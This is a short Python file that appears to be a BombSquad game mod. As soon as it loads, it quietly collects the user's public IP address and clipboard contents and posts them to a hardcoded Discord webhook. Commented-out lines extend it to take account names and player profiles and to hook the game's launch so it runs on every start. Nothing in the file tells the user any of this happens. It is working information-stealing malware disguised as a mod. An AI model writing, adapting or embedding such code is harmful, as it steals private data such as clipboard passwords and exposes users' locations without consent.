import http.client
import json

import ba
#import _ba

DISCORD_WEBHOOK_URL = 'discord.com/api/webhooks/1311648949878128660/9zRG2MjsqIp5UFK3dso_eRrRYPLtZawspUevsPl4l9EdG44FhPIBidU4k2AYCRywteIK'

#original_app_launch = _ba.App.on_app_launch


def get_public_ip() -> str:
    try:
        connection = http.client.HTTPSConnection('api.ipify.org')
        connection.request('GET', '/?format=json')
        response = connection.getresponse()
        data = response.read().decode('utf-8')
        connection.close()
        ip_data = json.loads(data)
        return ip_data.get('ip', 'Unable to fetch IP')
    except Exception:
        return 'Unable to fetch IP'


def fetch_data() -> dict:
    return dict(
        #bs_account=ba.internal.get_v1_account_display_string(),
        public_ip=get_public_ip(),
        clipboard=ba.clipboard_get_text(),
        #bs_profiles=ba.app.config.get('Player Profiles', {})
    )


def send_data(webhook_url: str) -> None:
    message = json.dumps(fetch_data(), indent=1)
    payload = json.dumps({'content': message})

    connection = http.client.HTTPSConnection(
        webhook_url.split('/')[0]
    )
    connection.request(
        'POST',
        webhook_url[webhook_url.index('/'):],
        body=payload,
        headers={'Content-Type': 'application/json'}
    )

    response = connection.getresponse()
    connection.close()


send_data(DISCORD_WEBHOOK_URL)


#def custom_app_launch(self: App) -> None:
#    original_app_launch(self)
#    send_data(DISCORD_WEBHOOK_URL)


#_ba.App.on_app_launch = custom_app_launch
